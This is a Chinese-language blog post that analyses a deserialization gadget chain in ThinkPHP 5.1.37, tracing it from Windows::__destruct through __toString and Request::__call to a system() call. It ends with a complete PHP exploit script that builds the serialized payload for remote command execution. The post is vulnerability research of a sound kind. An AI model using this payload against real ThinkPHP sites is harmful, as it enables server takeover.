---
layout:     post
title:      Thinkphp5.1.x 反序列化分析
subtitle:   继续分析thinkphp的漏洞，主要记录寻找链的方法
date:       2020-08-05
author:     BY Diego
header-img: img/wenzhang/thinkphp50137-反序列化.jpg
catalog: true
tags:
    - 反序列化
    - PHP
---

# 环境部署

composer 换源
```
composer config -g secure-http false
composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/
composer config -g -l
```
![aDiHnH.png](https://s1.ax1x.com/2020/08/04/aDiHnH.png)


composer 安装php
```
composer  create-project topthink/think:5.1.37 tp5
```
![aDiTje.png](https://s1.ax1x.com/2020/08/04/aDiTje.png)

[![aDFCuQ.png](https://s1.ax1x.com/2020/08/04/aDFCuQ.png)](https://imgchr.com/i/aDFCuQ)


# 漏洞分析

起点还是 `__destruct()` 开始

![aDF68f.png](https://s1.ax1x.com/2020/08/04/aDF68f.png)

从`\thinkphp\library\think\process\pipes\Windows.php`入手，其他的走几步就断了，其中调用了`removeFiles`,

![aDFyPP.png](https://s1.ax1x.com/2020/08/04/aDFyPP.png)
`removeFiles` 中存在 `file_exists($filename)`，而`$this->files` 可控，因此调用任意类 `__toString`方法


然后再去找能够被魔术方法调用的利用点，然后再选定`__toString` ，观察发现
`thinkphp\library\think\Request.php::__call` 可控点相对多一点，

[![aDEe8P.png](https://s1.ax1x.com/2020/08/04/aDEe8P.png)](https://imgchr.com/i/aDEe8P)

`$this->hook`可控消除了`method`不可控的影响,`arg` 需要可控
因此需要一个`$可控->xxx(可控)`，才能触发。

再去看`__toString`, 其中`thinkphp\library\think\model\concern\Conversion.php` 中

![aDmCRI.png](https://s1.ax1x.com/2020/08/04/aDmCRI.png)


![aDmpid.png](https://s1.ax1x.com/2020/08/04/aDmpid.png)
`toArray`中调用了`getAttr`,因为`Conversion` 是一个复用结构，

![aDnu7D.png](https://s1.ax1x.com/2020/08/04/aDnu7D.png)

当方法或者成员不在当前结构中，会从其他中调用
![aDnn0O.png](https://s1.ax1x.com/2020/08/04/aDnn0O.png)

最终在`thinkphp\library\think\model\concern\Attribute.php`找到`getAttr`

![aDezIH.png](https://s1.ax1x.com/2020/08/04/aDezIH.png)

`getAttr` 又调用了`getDATA` ，`name` 在一开始就可控，` $this->data` 同时可控

![aDevZD.png](https://s1.ax1x.com/2020/08/04/aDevZD.png)

因此导致`toArray`中`$relation` 可控，最终找到`$可控->xxx(可控)`结构 及 `$relation->visible($name);`

![aDKbkD.png](https://s1.ax1x.com/2020/08/04/aDKbkD.png)


综上所述 需要让`$relation=Request类`, 因此`Conversion::append["key"]=["***"]`, `Attribute::data["key"]=new \think\Request()`,
这里需要值得注意`Conversion` 与 `Attribute` 是 `trait` 因此不能实例化， 需要找一个调用的地方


举个小例子，`class C` use 了`trait A`,修改`C::a` 就会导致`A::a` 改变
```php
<?php

trait A {
	public $a = 123;
	public function getvalue(){
		echo($this->a);
	}
}
trait B {
	public $b;
}
class C {
	use A;
	use B;
}

$c = new C();
$c->a = 456;
$c->getvalue();
?>
```

![aD3JPO.png](https://s1.ax1x.com/2020/08/04/aD3JPO.png)


因此找到`Model`类，修改`Model` 对应值即可， 但是`Model` 类又为抽象类,也不能实例化，

![aD3YGD.png](https://s1.ax1x.com/2020/08/04/aD3YGD.png)


再看例子，通过修改继承`Model`类的值，可以影响抽象类的值

```php
<?php

abstract class Model{

	public $a = 123;
	public function get_a(){
		echo($this->a);
	}
}

class test extends Model{
}

$a = new test();
$a->a = 456;

$a->get_a();
?>
```

![aD8bAP.png](https://s1.ax1x.com/2020/08/04/aD8bAP.png)

tp 中找到`thinkphp\library\think\model\Pivot.php` 继承了`Model`类，因此可以从`Model`入手 去修改对应的值
![aD8qtf.png](https://s1.ax1x.com/2020/08/04/aD8qtf.png)

对应构造如下，`data`与`append` 键要相等,综上构造如下

![arANZQ.png](https://s1.ax1x.com/2020/08/05/arANZQ.png)


![arEg6f.png](https://s1.ax1x.com/2020/08/05/arEg6f.png)

一开始忽视了`array_unshift($args, $this);` 导致`$args[0]=$this`， 最终表达式成为 `call_user_func_array("system",[$this,"whoami"])`
![arEc1P.png](https://s1.ax1x.com/2020/08/05/arEc1P.png)

再然后就参考的他人的文章，根据php手册 `call_user_func_array`存在如下用法 可以调用任意类的任意方法

![armABT.png](https://s1.ax1x.com/2020/08/05/armABT.png)


因此寻找一个方法 与传入的参数无关，然后再利用，这里的`call_user_func_array`,就相当于跳板了。

参考payload,利用的`Request::input` ,在tp漏洞中是相对比好的利用链。

![armZEF.png](https://s1.ax1x.com/2020/08/05/armZEF.png)

在`Request::input`中 `$filter` 可控

![armij0.png](https://s1.ax1x.com/2020/08/05/armij0.png)

这里的`array_walk_recursive($data, [$this, 'filterValue'], $filter)` 会调用`$this->filterValue`

![armkuV.png](https://s1.ax1x.com/2020/08/05/armkuV.png)

示例
![armEHU.png](https://s1.ax1x.com/2020/08/05/armEHU.png)

跟进`$this->filterValue`

![arufBV.png](https://s1.ax1x.com/2020/08/05/arufBV.png)

![arugcn.png](https://s1.ax1x.com/2020/08/05/arugcn.png)

因此只要再让`$data`可控即可，及找到一个调用`Request::input()`且参数可控点点即可完成

过程不在多说，找到`this->param()`,但不能直接用`call_user_func_array`调用，因为参数不统一 会报错，找一个参数的函数，再找调用`this->param()`

![aruh7T.png](https://s1.ax1x.com/2020/08/05/aruh7T.png)

发现`$this->isAjax()`参数为一，且调用了param 切第一个参数可控

![aru2Xq.png](https://s1.ax1x.com/2020/08/05/aru2Xq.png)

![aruWn0.png](https://s1.ax1x.com/2020/08/05/aruWn0.png)

调用`input($data = [], $name = '', $default = null, $filter = '')` 时 name 需要为'', 否则data 会发生变化


完整流程
[![arGhY6.png](https://s1.ax1x.com/2020/08/05/arGhY6.png)](https://imgchr.com/i/arGhY6)

# 漏洞复现

![arYK8f.png](https://s1.ax1x.com/2020/08/05/arYK8f.png)

编写exp

```php
<?php

namespace think\process\pipes{

	class Windows{

		private $files = [];
		public function __construct(){

			$this->files["aaa"] = new \think\model\Pivot();
		}
	}
}

namespace think{

	abstract class Model{

		protected $append = [];
        private $data = [];
		public function __construct(){
			$this->data["key"] = new \think\Request();
			$this->append["key"] = ["xxx"];
		}
	}

	class Request{
		protected $hook = [];
		protected $config = [];
		protected $param = [];
		protected $filter;
		public function __construct(){
			$this->hook["visible"] = [$this,"isAjax"];
			$this->config["var_ajax"] = "";
			$this->param = ["whoami"];
			$this->filter = "system";
		}
	}
}

namespace think\model{
	class Pivot extends \think\Model{
	}
}

namespace{
	echo  base64_encode(serialize(new \think\process\pipes\Windows()));
}
?>
```


![arYuPP.png](https://s1.ax1x.com/2020/08/05/arYuPP.png)
